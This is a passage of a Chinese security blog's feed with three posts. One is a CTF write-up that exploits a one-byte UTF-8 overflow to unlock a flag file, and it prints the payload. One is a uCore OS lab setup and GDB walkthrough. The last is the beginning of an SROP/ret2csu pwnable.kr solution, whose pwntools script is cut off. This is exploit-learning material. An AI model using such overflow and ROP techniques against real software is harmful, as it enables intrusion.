href="#doc-pwn3-一字节溢出" class="headerlink" title="doc(pwn3:一字节溢出)"></a>doc(pwn3:一字节溢出)</h3><p>结合网页页面提示与ida反编译代码</p><p><img src="image-20221211193100827.png" alt="image-20221211193100827"></p><p><img src="image-20221211192954412.png" alt="image-20221211192954412"></p><p><img src="image-20221211193217859.png" alt="image-20221211193217859"></p><p><img src="image-20221211193300213.png" alt="image-20221211193300213"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过web页面的提示，了解了web页面的执行流程：用户可通过 /doc/upload 上传一个文件，通过 /doc/ls 查看当前全部文件，通过 /doc/extract 查看文件内容，通过 /doc/extract_many 查看多个文件内容。</p><p><img src="image-20221211193432756.png" alt="image-20221211193432756"></p><p><img src="image-20221211193448481.png" alt="image-20221211193448481"></p><p> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;又根据web页面中flag的 mode:FORBIDDEN 这一提示，得到一个解题思路：修改flag的mode为ALLOW使其可读。既然反编译代码中出现了extract与extract_many这俩同名函数，那我们就从这俩函数着重审起，最后在审计extract_many函数的过程中发现get_utf8_text中的strencodencpy函数在边界上会溢出一个字节。</p><p><img src="image-20221211221924954.png" alt="image-20221211221924954"></p><p><img src="image-20221211221946283.png" alt="image-20221211221946283"></p><p>而mode值不为0即可被视为ALLOW</p><p><img src="image-20221211222013583.png" alt="image-20221211222013583"></p><p>最后由utf-8 4bytes字符第四字节值范围可知随机挑选一个字符放在最后即可</p><p><img src="image-20221211222058716.png" alt="image-20221211222058716"></p><p><img src="image-20221211222109375-16707684703451-16707684705223.png" alt="image-20221211222109375"></p><p>最后上传的doc文档中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈𒀐哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈</span><br></pre></td></tr></table></figure><p><img src="image-20221211222146832.png" alt="image-20221211222146832"></p>]]></content>
    
    
    <summary type="html">比赛</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ucore-lab1</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/11/24/ucore-lab1/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/11/24/ucore-lab1/</id>
    <published>2022-11-24T02:09:54.000Z</published>
    <updated>2023-03-11T10:10:01.734Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span> 一 <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;orange&quot;</span>&gt;</span> 二 <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line"></span><br><span class="line">C:\blog\source\_posts\ucore-lab1\</span><br></pre></td></tr></table></figure><p><strong>实验视频链接(*)：</strong><a href="https://www.xuetangx.com/learn/THU08091000267/THU08091000267/12424484/video/23272531">操作系统 - 清华大学 - 学堂在线 (xuetangx.com)</a></p><p><strong>实验文档链接(*)：</strong><a href="https://objectkuan.gitbooks.io/ucore-docs/content/lab1/lab1_2_1_2_ex2.html">练习2 | uCore Lab Documents (gitbooks.io)</a></p><p><strong>实验参考链接(*)：</strong><a href="https://kiprey.github.io/2020/08/uCore-1/#%E7%BB%83%E4%B9%A0%E8%A7%A3%E7%AD%94">uCore实验 - Lab1 | Kiprey’s Blog</a></p><p>参考链接：<a href="https://blog.csdn.net/qq_20549085/article/details/100128521">操作系统实验Ucore lab1_StarashZ的博客-CSDN博客</a></p><p>参考链接：<a href="https://blog.csdn.net/CNRalap/article/details/124352498">ucore lab1_CNRalap的博客-CSDN博客</a></p><h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a><font color="red">理论</font></h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学理论的话去上面我贴的博客里学吧，我东西不多，总结不出来什么，</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但多少能写点东西，就直接写在下面的实操里面里好了。</p><br/><h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a><font color="red">实操</font></h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下是我各练习的实际动手操作</p><br/><h2 id="将实验转至ubuntu18-04"><a href="#将实验转至ubuntu18-04" class="headerlink" title="将实验转至ubuntu18.04"></a>将实验转至ubuntu18.04</h2><p>1、下载实验代码(需翻墙)，解压移至ubuntu18.04</p><p>链接：<a href="https://raw.githubusercontent.com/sjyfok/moocos/master/ucore_os_lab-master.zip">raw.githubusercontent.com</a></p><p>安装gcc-4.8：<code>$ sudo apt install gcc-4.8</code></p><p>查看是否安装成功：<code>$ gcc-4.8 --version</code></p><p>安装qemu：<code>$ sudo apt install qemu-system</code></p><p>下载失败则换中科院源：<a href="https://mirrors.ustc.edu.cn/repogen/">https://mirrors.ustc.edu.cn/repogen/</a>  (可以不用进链接，源我copy在下面了，照着步骤做就行)</p><p><code>/etc/apt</code> 目录下修改sources.list ：<code>$ sudo rm sources.list</code> 、<code>$ sudo vim sources.list</code></p><p>以下内容复制进sources.list，(链接：<a href="https://mirrors.ustc.edu.cn/repogen/">LUG’s repo file generator (ustc.edu.cn)</a>，Ubuntu、HTTPS、IPv4、bionic(18.04)、Download)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ kinetic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ kinetic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ kinetic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ kinetic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ kinetic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ kinetic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ kinetic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ kinetic-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">## Not recommended</span><br><span class="line"># deb https://mirrors.ustc.edu.cn/ubuntu/ kinetic-proposed main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ kinetic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><p><code>$ sudo apt-get update</code>  到这中科院源就算是换好了，重新输入qemu安装指令即可，还不行的话可以采取重启虚拟机、换其他运营商的热点等措施</p><p><code>$ qemu-system-i386 --version</code>：提示如下表示qemu安装成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xy666@ubuntu:~/Desktop/czxt$ qemu-system-i386 --version</span><br><span class="line">QEMU emulator version 2.11.1(Debian 1:2.11+dfsg-1ubuntu7.40)</span><br><span class="line">Copyright (c) 2003-2017 Fabrice Bellard and the QEMU Project developers</span><br></pre></td></tr></table></figure><p>打开移动至ubuntu18.04中的实验目录，切至lab1目录(ucore_os_lab-master/labcodes/lab1)，更改Makefile中的以下字段，保存</p><p><code>HOSTCC        := gcc</code> 改为  <code>HOSTCC        := gcc-4.8</code></p><p><code>CC        := $(GCCPREFIX)gcc</code> 改为 <code>CC        := $(GCCPREFIX)gcc-4.8</code></p><p><code>$ make V=</code>  、<code>$ make clean</code>        (make：编译，make clean：清除编译)</p><p><code>$ make qemu</code></p><p>打开两个终端</p><p>第一个终端输入：<code>$ qemu-system-i386 -hda ./bin/ucore.img -S -s</code></p><p>第二个终端打开gdb后在gdb中输入：<code>$ target remote :1234</code></p><p>最后在0x7c00下断点运行：<code>gdb-peda$ b *0x7c00</code></p><br/><h2 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a><font color="orange">练习1</font></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd ucore_os_lab-master/labcodes/lab1</span><br><span class="line">$ make V=</span><br></pre></td></tr></table></figure><br/><h2 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a><font color="orange">练习2</font></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#当前路径:[~/ucore_os_lab-master/labcodes/lab1/tools]</span></span><br><span class="line">  $ vim gdbinit</span><br><span class="line">  <span class="comment">#修改为：</span></span><br><span class="line">    file obj/bootblock.o</span><br><span class="line">    <span class="built_in">set</span> architecture i8086</span><br><span class="line">    target remote :<span class="number">1234</span></span><br><span class="line">    b* <span class="number">0x7c00</span></span><br><span class="line"></span><br><span class="line">    define hook-stop</span><br><span class="line">    x/i $eip</span><br><span class="line">    end</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#当前路径:[~/ucore_os_lab-master/labcodes/lab1]  </span></span><br><span class="line">  $ make debug</span><br></pre></td></tr></table></figure><p>我没用以上的 <code>$ make debug</code> 开启调试</p><p>我用的下面的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[~/ucore_os_lab-master/labcodes/lab1] 路径下</span></span><br><span class="line">  $ make clean</span><br><span class="line">  $ make qemu</span><br><span class="line">    </span><br><span class="line"><span class="comment">#打开两个终端</span></span><br><span class="line">  <span class="comment">#第一个终端</span></span><br><span class="line">    $ qemu-system-i386 -hda ./<span class="built_in">bin</span>/ucore.img -S -s</span><br><span class="line">  <span class="comment">#第二个终端</span></span><br><span class="line">    $ gdb</span><br><span class="line">    gdb-peda$ target remote :<span class="number">1234</span>    </span><br><span class="line">    gdb-peda$ b *<span class="number">0x7c00</span></span><br><span class="line">    gdb-peda$ r</span><br></pre></td></tr></table></figure><p><strong>任务：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. 从CPU加电后执⾏的第⼀条指令开始，单步跟踪BIOS的执⾏。</span></span><br><span class="line">    gdb连接上qemu后(即gdb-peda$ target remote :<span class="number">1234</span>这一步之后)ni/si单步调试即可</span><br><span class="line"></span><br><span class="line"><span class="comment">#2. 在初始化位置0x7c00设置实地址断点,测试断点正常。</span></span><br><span class="line">    跟着上面的操作输指令即可</span><br><span class="line"></span><br><span class="line"><span class="comment">#3. 从0x7c00开始跟踪代码运⾏,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进⾏⽐较。</span></span><br><span class="line">    比较发现从<span class="number">0x7c00</span>开始就是在执行 bootasm.S 和 bootblock.asm 中的代码</span><br><span class="line">    bootasm.S在ucore_os_lab-master/labcodes/lab1/boot/目录下</span><br><span class="line">    bootblock.asm在ucore_os_lab-master/labcodes/lab1/obj/目录下</span><br><span class="line"></span><br><span class="line"><span class="comment">#4. ⾃⼰找⼀个bootloader或内核中的代码位置，设置断点并进⾏测试。</span></span><br><span class="line">    略</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过程(从0x7c00开始)，以下代码是我从gdb调试中抠出来的，gdb和bootasm.S用的是不同的汇编风格，例如mov和movl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">   0x7bfa:add    BYTE PTR [eax],al</span><br><span class="line">   0x7bfc:add    BYTE PTR [eax],al</span><br><span class="line">   0x7bfe:add    BYTE PTR [eax],al</span><br><span class="line">=&gt; 0x7c00:cli    </span><br><span class="line">   0x7c01:cld    </span><br><span class="line">   0x7c02:xor    eax,eax</span><br><span class="line">   0x7c04:mov    ds,eax</span><br><span class="line">   0x7c06:mov    es,eax</span><br><span class="line">   0x7c08:mov    ss,eax</span><br><span class="line">   0x7c0a:in     al,0x64</span><br><span class="line">   0x7c0c:test   al,0x2</span><br><span class="line">   0x7c0e:jne    0x7c0a</span><br><span class="line">   0x7c10:mov    al,0xd1</span><br><span class="line">   0x7c12:out    0x64,al</span><br><span class="line">   0x7c14:in     al,0x64</span><br><span class="line">   0x7c16:test   al,0x2</span><br><span class="line">   0x7c18:jne    0x7c14</span><br><span class="line">   0x7c1a:mov    al,0xdf</span><br><span class="line">   0x7c1c:out    0x60,al</span><br><span class="line">   0x7c1e:lgdtd  [esi]</span><br><span class="line">   0x7c21:ins    BYTE PTR es:[edi],dx</span><br><span class="line">   0x7c22:jl     0x7c33</span><br><span class="line">   ----0x7c23:mov    eax,cr0    #这里出现了一个奇怪的现象</span><br><span class="line">   0x7c24:and    al,al</span><br><span class="line">   0x7c26:or     ax,0x1</span><br><span class="line">   0x7c2a:mov    cr0,eax</span><br><span class="line">   0x7c2d:jmp    0xb866:0x87c32</span><br><span class="line">   ----0x7c32:mov    ax,0x10    #agin</span><br><span class="line">   0x7c34:adc    BYTE PTR [eax],al</span><br><span class="line">   0x7c36:mov    ds,eax</span><br><span class="line">   0x7c38:mov    es,eax</span><br><span class="line">   0x7c3a:mov    fs,eax</span><br><span class="line">   0x7c3c:mov    gs,eax</span><br><span class="line">   0x7c3e:mov    ss,eax</span><br><span class="line">   0x7c40:mov    ebp,0x0</span><br><span class="line">   0x7c45:mov    esp,0x7c00</span><br><span class="line">   0x7c4a:call   0x7cd1         #调用函数</span><br><span class="line">      0x7cce:pop    edi</span><br><span class="line">      0x7ccf:pop    ebp</span><br><span class="line">      0x7cd0:ret    </span><br><span class="line">   =&gt; 0x7cd1:push   ebp</span><br><span class="line">      0x7cd2:mov    ebp,esp</span><br><span class="line">      0x7cd4:push   edi</span><br><span class="line">      0x7cd5:push   esi</span><br><span class="line">      0x7cd6:push   ebx</span><br><span class="line">      0x7cd7:mov    ebx,0x1</span><br><span class="line">      0x7cdc:sub    esp,0x1c</span><br><span class="line">      0x7cdf:lea    eax,[ebx+0x7f]</span><br><span class="line">      0x7ce2:mov    edx,ebx</span><br><span class="line">      0x7ce4:shl    eax,0x9</span><br><span class="line">      0x7ce7:inc    ebx</span><br><span class="line">      0x7ce8:call   0x7c72     #调用函数</span><br><span class="line">       =&gt; 0x7c72:push   ebp</span><br><span class="line">          0x7c73:mov    ecx,edx</span><br><span class="line">          0x7c75:mov    ebp,esp</span><br><span class="line">      0x7ced:cmp    ebx,0x9</span><br><span class="line">      0x7cf0:jne    0x7cdf     #跳转</span><br><span class="line">          0x7cd6:push   ebx</span><br><span class="line">          0x7cd7:mov    ebx,0x1</span><br><span class="line">          0x7cdc:sub    esp,0x1c</span><br><span class="line">       =&gt; 0x7cdf:lea    eax,[ebx+0x7f]</span><br><span class="line">          0x7ce2:mov    edx,ebx</span><br><span class="line">          0x7ce4:shl    eax,0x9</span><br><span class="line">          0x7ce7:inc    ebx</span><br><span class="line">          0x7ce8:call   0x7c72</span><br><span class="line">           =&gt; 0x7c72:push   ebp</span><br><span class="line">              0x7c73:mov    ecx,edx</span><br><span class="line">              0x7c75:mov    ebp,esp</span><br><span class="line">              0x7c77:mov    edx,0x1f7</span><br><span class="line">              </span><br><span class="line">    #......晕了，先列这么多</span><br></pre></td></tr></table></figure><p><img src="image-20221126110807692.png" alt="image-20221126110807692"></p><p>上图最后的 call bootmain 应该对应的是call 0x7cd1，现在进入bootblock中查看，的确进入了bootblock.asm中</p><p><img src="image-20221126111230818.png" alt="image-20221126111230818"></p><p>接下来进行练习3</p><br/><h2 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a><font color="orange">练习3</font></h2><p><strong>1、请分析bootloader是如何完成从实模式进入保护模式的：</strong></p>]]></content>
    
    
    <summary type="html">操作系统</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>unexploitable</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/11/07/unexploitable/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/11/07/unexploitable/</id>
    <published>2022-11-07T11:26:43.000Z</published>
    <updated>2022-12-11T14:53:32.063Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span> 2017 <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">二级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;green&quot;</span>&gt;</span> quals <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">三级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;orange&quot;</span>&gt;</span> cfi <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line">SROP、vsyscall</span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br></pre></td></tr></table></figure><h1 id="pwnable-kr-unexploitable"><a href="#pwnable-kr-unexploitable" class="headerlink" title=" pwnable.kr unexploitable "></a><center><font color="red"> pwnable.kr unexploitable </font></center></h1><p>参考博文：<a href="https://blingblingxuanxuan.github.io/2022/11/06/unexploitable-pwn/#%E6%96%B9%E6%B3%951-vsyscall%E6%9A%B4%E7%A0%B4%E9%80%9A%E8%A7%A3">pwn题练习之unexploitable | blingbling’s blog (blingblingxuanxuan.github.io)</a></p><h2 id="SROP-ret2csu解法"><a href="#SROP-ret2csu解法" class="headerlink" title=" SROP+ret2csu解法 "></a><center><font color="green"> SROP+ret2csu解法 </font></center></h2><p>参考链接：<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki (ctf-wiki.org)</a></p><p>参考博文：<a href="https://blog.csdn.net/lrlhy1/article/details/116124507">pwnable.kr unexploitable题解_落日领航员的博客-CSDN博客</a></p><p>参考博文：<a href="https://www.cnblogs.com/z2yh/p/13731277.html">Srop 原理与利用方法 - z2yh - 博客园 (cnblogs.com)</a></p><p><img src="1.png" alt="signal2-stack"></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title=" 解题思路 "></a><center><font color="orange"> 解题思路 </font></center></h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、利用 __libc_csu_init（ret2csu） 实现多次执行 main()、read()</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、向bss段读入伪造的sigFrame</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、向bss段读入 “/bin/sh” 字符串</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4、栈迁移，使 rsp、rbp 指向 sigFram 附近 (目标是要使rbp上的ret为sigFram的rt_sigreturn表项)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#解题环境：ubuntu18.04</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;unexploitable&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">io = sh.run(<span class="string">&#x27;./unexploitable&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read = <span class="number">0x601000</span></span><br><span class="line">main = <span class="number">0x400544</span></span><br><span class="line">bss_frame  = 